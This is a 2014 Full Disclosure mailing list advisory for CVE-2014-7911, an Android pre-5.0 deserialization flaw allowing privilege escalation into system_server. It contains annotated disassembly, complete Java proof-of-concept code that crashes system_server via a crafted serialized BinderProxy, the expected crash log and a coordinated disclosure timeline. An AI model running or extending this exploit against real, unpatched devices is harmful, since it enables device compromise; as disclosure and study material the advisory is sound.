@@ -1,0 +1,216 @@
+
+Date: Wed, 19 Nov 2014 02:31:15 +0100
+From: Jann Horn <jann@...jh.net>
+To: fulldisclosure@...lists.org
+Subject: [FD] CVE-2014-7911: Android <5.0 Privilege Escalation using
+ ObjectInputStream
+
+In Android <5.0, java.io.ObjectInputStream did not check whether the Object that
+is being deserialized is actually serializable. That issue was fixed in Android
+5.0 with this commit:
+<https://android.googlesource.com/platform/libcore/+/738c833d38d41f8f76eb7e77ab39add82b1ae1e2>
+
+This means that when ObjectInputStream is used on untrusted inputs, an attacker
+can cause an instance of any class with a non-private parameterless constructor
+to be created. All fields of that instance can be set to arbitrary values. The
+malicious object will then typically either be ignored or cast to a type to
+which it doesn't fit, implying that no methods will be called on it and no data
+from it will be used. However, when it is collected by the GC, the GC will call
+the object's finalize method.
+
+The android system_service runs under uid 1000 and can change into the context
+of any app, install new applications with arbitrary permissions and so on. Apps
+can talk to it using Intents with attached Bundles, Bundles are transferred as
+arraymap Parcels and arraymap Parcels can contain serialized data. This means
+that any app can attack the system_service this way.
+
+The class android.os.BinderProxy contains a finalize method that calls into
+native code. This native code will then use the values of two fields of type
+int/long (depends on the Android version), cast them to pointers and follow
+them. On Android 4.4.3, this is where one of those pointers ends up. r0
+contains the attacker-supplied pointer, and if the attacker can insert data
+into the process at a known address, he ends up gaining arbitrary code
+execution in system_server:
+
+    # attacker controls pointer in r0
+0000d1c0 <android::RefBase::decStrong(void const*) const>:
+    d1c0:       b570            push    {r4, r5, r6, lr}
+    d1c2:       4605            mov     r5, r0
+    d1c4:       6844            ldr     r4, [r0, #4]   # attacker controls r4
+    d1c6:       460e            mov     r6, r1
+    d1c8:       4620            mov     r0, r4
+    d1ca:       f7fd e922       blx     a410 <android_atomic_dec@plt>
+    d1ce:       2801            cmp     r0, #1
+    d1d0:       d10b            bne.n   d1ea
+<android::RefBase::decStrong(void const*) const+0x2a>
+    d1d2:       68a0            ldr     r0, [r4, #8]   # attacker controls r0
+    d1d4:       4631            mov     r1, r6
+    d1d6:       6803            ldr     r3, [r0, #0]   # attacker controls r3
+    d1d8:       68da            ldr     r2, [r3, #12]  # attacker controls r2
+    d1da:       4790            blx     r2             # jump into attacker-controlled r2 pointer
+
+Android does have ASLR, but like all apps, system_server is forked from the
+zygote process - in other words, all apps have the same basic memory layout as
+system_server and should therefore be able to circumvent system_server's ASLR.
+
+Here's my crash PoC code. Put it in an android app, install that app, open it.
+If nothing happens, the GC might be taking its time - try doing other stuff or
+reopening the PoC app or so. Your device should do something like a reboot
+after a few seconds.
+
+===============================================================================
+package net.thejh.badserial;
+
+import java.io.Serializable;
+import java.io.UnsupportedEncodingException;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+
+import dalvik.system.DexClassLoader;
+
+import android.app.Activity;
+import android.content.Context;
+import android.os.Bundle;
+import android.os.IBinder;
+import android.os.Parcel;
+import android.os.UserHandle;
+import android.os.UserManager;
+import android.util.Log;
+
+public class MainActivity extends Activity {
+	private static final java.lang.String DESCRIPTOR = "android.os.IUserManager";
+	private Class clStub;
+	private Class clProxy;
+	private int TRANSACTION_setApplicationRestrictions;
+	private IBinder mRemote;
+	
+	public void setApplicationRestrictions(java.lang.String packageName, android.os.Bundle restrictions, int userHandle) throws android.os.RemoteException
+	{
+		android.os.Parcel _data = android.os.Parcel.obtain();
+		android.os.Parcel _reply = android.os.Parcel.obtain();
+		try {
+			_data.writeInterfaceToken(DESCRIPTOR);
+			_data.writeString(packageName);
+			_data.writeInt(1);
+			restrictions.writeToParcel(_data, 0);
+			_data.writeInt(userHandle);
+			
+	        byte[] data = _data.marshall();
+	        for (int i=0; true; i++) {
+	        	if (data[i] == 'A' && data[i+1] == 'A' && data[i+2] == 'd' && data[i+3] == 'r') {
+	        		data[i] = 'a';
+	        		data[i+1] = 'n';
+	        		break;
+	        	}
+	        }
+	        _data.recycle();
+	        _data = Parcel.obtain();
+	        _data.unmarshall(data, 0, data.length);
+			
+			mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, 0);
+			_reply.readException();
+		}
+		finally {
+			_reply.recycle();
+			_data.recycle();
+		}
+	}
+
+	@Override
+	public void onCreate(Bundle savedInstanceState) {
+		super.onCreate(savedInstanceState);
+		setContentView(R.layout.activity_main);
+
+		Log.i("badserial", "starting... (v3)");
+
+		Context ctx = getBaseContext();
+		try {
+			Bundle b = new Bundle();
+			AAdroid.os.BinderProxy evilProxy = new AAdroid.os.BinderProxy();
+			b.putSerializable("eatthis", evilProxy);
+			
+			Class clIUserManager = Class.forName("android.os.IUserManager");
+			Class[] umSubclasses = clIUserManager.getDeclaredClasses();
+			System.out.println(umSubclasses.length+" inner classes found");
+			Class clStub = null;
+			for (Class c: umSubclasses) {
+				System.out.println("inner class: "+c.getCanonicalName());
+				if (c.getCanonicalName().equals("android.os.IUserManager.Stub")) {
+					clStub = c;
+				}
+			}
+			
+			Field fTRANSACTION_setApplicationRestrictions =
+					clStub.getDeclaredField("TRANSACTION_setApplicationRestrictions");
+			fTRANSACTION_setApplicationRestrictions.setAccessible(true);
+			TRANSACTION_setApplicationRestrictions =
+					fTRANSACTION_setApplicationRestrictions.getInt(null);
+			
+			UserManager um = (UserManager) ctx.getSystemService(Context.USER_SERVICE);
+			Field fService = UserManager.class.getDeclaredField("mService");
+			fService.setAccessible(true);
+			Object proxy = fService.get(um);
+			
+			Class[] stSubclasses = clStub.getDeclaredClasses();
+			System.out.println(stSubclasses.length+" inner classes found");
+			clProxy = null;
+			for (Class c: stSubclasses) {
+				System.out.println("inner class: "+c.getCanonicalName());
+				if (c.getCanonicalName().equals("android.os.IUserManager.Stub.Proxy")) {
+					clProxy = c;
+				}
+			}
+			
+			Field fRemote = clProxy.getDeclaredField("mRemote");
+			fRemote.setAccessible(true);
+			mRemote = (IBinder) fRemote.get(proxy);
+
+			UserHandle me = android.os.Process.myUserHandle();
+			setApplicationRestrictions(ctx.getPackageName(), b, me.hashCode());
+			
+			Log.i("badserial", "waiting for boom here and over in the system service...");
+		} catch (Exception e) {
+			throw new RuntimeException(e);
+		}
+	}
+}
+===============================================================================
+package AAdroid.os;
+
+import java.io.Serializable;
+
+public class BinderProxy implements Serializable {
+	private static final long serialVersionUID = 0;
+	public long mObject = 0x1337beef;
+	public long mOrgue = 0x1337beef;
+}
+===============================================================================
+
+
+This is what you should see in the system log:
+
+F/libc    (  382): Fatal signal 11 (SIGSEGV) at 0x1337bef3 (code=1), thread 391 (FinalizerDaemon)
+[...]
+I/DEBUG   (   47): pid: 382, tid: 391, name: FinalizerDaemon  >>> system_server <<<
+I/DEBUG   (   47): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 1337bef3
+I/DEBUG   (   47):     r0 1337beef  r1 b6de7431  r2 b6ee035c  r3 81574845
+I/DEBUG   (   47):     r4 b6de7431  r5 1337beef  r6 b7079ec8  r7 1337beef
+I/DEBUG   (   47):     r8 1337beef  r9 abaf5f68  sl b7056678  fp a928bb04
+I/DEBUG   (   47):     ip b6e1e8c8  sp a928bac8  lr b6de63d9  pc b6e6c15e  cpsr 60000030
+
+
+Timeline:
+22.06.2014 - 26.06.2014  issue reported, PoC shared,
+                         issue verified by security@...roid.com
+around 03.11.2014        patch published as part of the AOSP code release
+07.11.2014 - 19.11.2014  asked Android team whether disclosing this is OK now,
+                         got CVE number from them
+
+Download attachment "signature.asc" of type "application/pgp-signature" (820 bytes)
+
+
+_______________________________________________
+Sent through the Full Disclosure mailing list
+http://nmap.org/mailman/listinfo/fulldisclosure
+Web Archives & RSS: http://seclists.org/fulldisclosure/
